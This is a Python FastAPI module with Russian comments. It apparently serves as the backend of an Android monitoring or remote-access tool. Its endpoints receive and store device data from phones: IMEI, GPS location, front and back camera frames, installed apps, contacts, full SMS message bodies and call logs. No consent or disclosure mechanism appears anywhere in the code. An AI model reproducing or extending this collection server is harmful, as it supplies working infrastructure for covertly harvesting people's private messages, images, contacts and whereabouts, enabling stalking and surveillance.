"""REST API endpoints для устройств с device_id в пути"""
from fastapi import APIRouter, HTTPException, Depends, Header, Body
from typing import Optional, List
from pydantic import BaseModel
from datetime import datetime
from backend.storage.database import storage
from backend.devices.registration import get_device_by_token
from backend.database.models import Device
import base64

router = APIRouter(prefix="/api/devices", tags=["devices"])


async def get_device_by_token_header(
    authorization: str = Header(..., description="Bearer token")
) -> Device:
    """Получить устройство по токену из заголовка Authorization"""
    if not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Invalid authorization header format")
    
    token = authorization.replace("Bearer ", "").strip()
    device = await get_device_by_token(token)
    if not device:
        raise HTTPException(status_code=401, detail="Invalid device token")
    
    return device


# ============================================================================
# Модели данных
# ============================================================================

class BatteryData(BaseModel):
    level: int
    is_charging: bool
    temperature: Optional[float] = None
    voltage: Optional[float] = None
    health: Optional[str] = None
    timestamp: datetime

class DeviceInfoData(BaseModel):
    manufacturer: Optional[str] = None
    model: Optional[str] = None
    android_version: Optional[str] = None
    sdk_version: Optional[int] = None
    serial_number: Optional[str] = None
    imei: Optional[str] = None
    timestamp: datetime

class LocationData(BaseModel):
    latitude: float
    longitude: float
    accuracy: Optional[float] = None
    altitude: Optional[float] = None
    speed: Optional[float] = None
    timestamp: datetime

class CameraFrameData(BaseModel):
    camera: str  # "front" or "back"
    image_base64: str
    width: Optional[int] = 1920
    height: Optional[int] = 1080
    timestamp: datetime

class LogEntry(BaseModel):
    level: str
    message: str
    timestamp: datetime

class LogsData(BaseModel):
    logs: List[LogEntry]
    timestamp: datetime

class SystemStatsData(BaseModel):
    ram_total: Optional[int] = None
    ram_used: Optional[int] = None
    ram_free: Optional[int] = None
    cpu_usage: Optional[float] = None
    storage_total: Optional[int] = None
    storage_used: Optional[int] = None
    storage_free: Optional[int] = None
    timestamp: datetime

class AppInfo(BaseModel):
    package_name: str
    app_name: str
    version: Optional[str] = None
    install_time: Optional[datetime] = None

class AppsData(BaseModel):
    apps: List[AppInfo]
    timestamp: datetime

class Contact(BaseModel):
    name: str
    phone: Optional[str] = None
    email: Optional[str] = None

class ContactsData(BaseModel):
    contacts: List[Contact]
    timestamp: datetime

class SMSMessage(BaseModel):
    sender: str
    body: str
    timestamp: datetime
    is_read: bool

class SMSData(BaseModel):
    messages: List[SMSMessage]
    timestamp: datetime

class CallLog(BaseModel):
    number: str
    type: str  # "incoming" | "outgoing" | "missed"
    duration: int
    timestamp: datetime

class CallLogsData(BaseModel):
    calls: List[CallLog]
    timestamp: datetime

class HeartbeatData(BaseModel):
    status: str
    timestamp: datetime


# ============================================================================
# Endpoints
# ============================================================================

@router.post("/{device_id}/battery")
async def post_battery(
    device_id: str,
    data: BatteryData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Отправка данных о батарее"""
    # Проверка, что device_id совпадает с устройством из токена
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    # Сохранение данных
    battery_data = {
        "level": data.level,
        "is_charging": data.is_charging,
        "temperature": data.temperature,
        "voltage": data.voltage,
        "health": data.health
    }
    
    await storage.log_device_event(
        device_id=device_id,
        event_type="battery_info",
        event_data=battery_data,
        timestamp=int(data.timestamp.timestamp() * 1000)
    )
    
    return {"status": "success", "message": "Battery data saved"}


@router.post("/{device_id}/device-info")
async def post_device_info(
    device_id: str,
    data: DeviceInfoData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Обновление информации об устройстве"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    # Обновление устройства
    await storage.update_device(
        device_id,
        name=f"{data.manufacturer or device.manufacturer or 'Unknown'} {data.model or device.model or 'Device'}",
        imei=data.imei or device.imei,
        model=data.model or device.model,
        manufacturer=data.manufacturer or device.manufacturer,
        android_version=data.android_version or device.android_version,
        sdk=data.sdk_version or device.sdk
    )
    
    return {"status": "success", "message": "Device info updated"}


@router.post("/{device_id}/location")
async def post_location(
    device_id: str,
    data: LocationData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Отправка геолокации"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    await storage.save_location(
        device_id=device_id,
        lat=data.latitude,
        lon=data.longitude,
        accuracy=data.accuracy,
        timestamp=int(data.timestamp.timestamp() * 1000)
    )
    
    return {"status": "success", "message": "Location saved"}


@router.post("/{device_id}/camera-frame")
async def post_camera_frame(
    device_id: str,
    data: CameraFrameData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Отправка фото с камеры"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    if data.camera not in ["front", "back"]:
        raise HTTPException(status_code=400, detail="Camera must be 'front' or 'back'")
    
    # Декодирование base64
    try:
        if data.image_base64.startswith("data:image"):
            image_base64 = data.image_base64.split(",")[1]
        else:
            image_base64 = data.image_base64
        frame_data = base64.b64decode(image_base64)
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid base64 image: {str(e)}")
    
    # Сохранение кадра
    saved_frame = await storage.save_camera_frame(
        device_id=device_id,
        camera=data.camera,
        frame_data=frame_data,
        width=data.width or 1920,
        height=data.height or 1080,
        timestamp=int(data.timestamp.timestamp() * 1000)
    )
    
    return {"status": "success", "frame_id": str(saved_frame.id), "message": "Camera frame saved"}


@router.post("/{device_id}/logs")
async def post_logs(
    device_id: str,
    data: LogsData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Отправка логов"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    # Сохранение каждого лога
    for log in data.logs:
        await storage.log_device_event(
            device_id=device_id,
            event_type="log",
            event_data={
                "level": log.level,
                "message": log.message
            },
            timestamp=int(log.timestamp.timestamp() * 1000)
        )
    
    return {"status": "success", "count": len(data.logs), "message": "Logs saved"}


@router.post("/{device_id}/system-stats")
async def post_system_stats(
    device_id: str,
    data: SystemStatsData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Системная информация (RAM, CPU, Storage)"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    system_data = {
        "ram_total": data.ram_total,
        "ram_used": data.ram_used,
        "ram_free": data.ram_free,
        "cpu_usage": data.cpu_usage,
        "storage_total": data.storage_total,
        "storage_used": data.storage_used,
        "storage_free": data.storage_free
    }
    
    await storage.log_device_event(
        device_id=device_id,
        event_type="system_stats",
        event_data=system_data,
        timestamp=int(data.timestamp.timestamp() * 1000)
    )
    
    return {"status": "success", "message": "System stats saved"}


@router.post("/{device_id}/apps")
async def post_apps(
    device_id: str,
    data: AppsData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Список установленных приложений"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    apps_data = []
    for app in data.apps:
        apps_data.append({
            "package_name": app.package_name,
            "app_name": app.app_name,
            "version": app.version,
            "install_time": int(app.install_time.timestamp() * 1000) if app.install_time else None
        })
    
    await storage.log_device_event(
        device_id=device_id,
        event_type="installed_apps",
        event_data={"apps": apps_data},
        timestamp=int(data.timestamp.timestamp() * 1000)
    )
    
    return {"status": "success", "count": len(data.apps), "message": "Apps list saved"}


@router.post("/{device_id}/contacts")
async def post_contacts(
    device_id: str,
    data: ContactsData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Контакты"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    contacts_data = []
    for contact in data.contacts:
        contacts_data.append({
            "name": contact.name,
            "phone": contact.phone,
            "email": contact.email
        })
    
    await storage.log_device_event(
        device_id=device_id,
        event_type="contacts",
        event_data={"contacts": contacts_data},
        timestamp=int(data.timestamp.timestamp() * 1000)
    )
    
    return {"status": "success", "count": len(data.contacts), "message": "Contacts saved"}


@router.post("/{device_id}/sms")
async def post_sms(
    device_id: str,
    data: SMSData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """СМС сообщения"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    for msg in data.messages:
        await storage.log_device_event(
            device_id=device_id,
            event_type="sms",
            event_data={
                "sender": msg.sender,
                "body": msg.body,
                "is_read": msg.is_read
            },
            timestamp=int(msg.timestamp.timestamp() * 1000)
        )
    
    return {"status": "success", "count": len(data.messages), "message": "SMS messages saved"}


@router.post("/{device_id}/call-logs")
async def post_call_logs(
    device_id: str,
    data: CallLogsData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """История звонков"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    for call in data.calls:
        await storage.log_device_event(
            device_id=device_id,
            event_type="call_log",
            event_data={
                "number": call.number,
                "type": call.type,
                "duration": call.duration
            },
            timestamp=int(call.timestamp.timestamp() * 1000)
        )
    
    return {"status": "success", "count": len(data.calls), "message": "Call logs saved"}


@router.post("/{device_id}/heartbeat")
async def post_heartbeat(
    device_id: str,
    data: HeartbeatData = Body(...),
    device: Device = Depends(get_device_by_token_header)
):
    """Простой пинг для проверки онлайн статуса"""
    if str(device.id) != device_id:
        raise HTTPException(status_code=403, detail="Device ID mismatch")
    
    # Обновление last_seen
    await storage.update_device(device_id)
    
    return {"status": "success", "message": "Heartbeat received"}

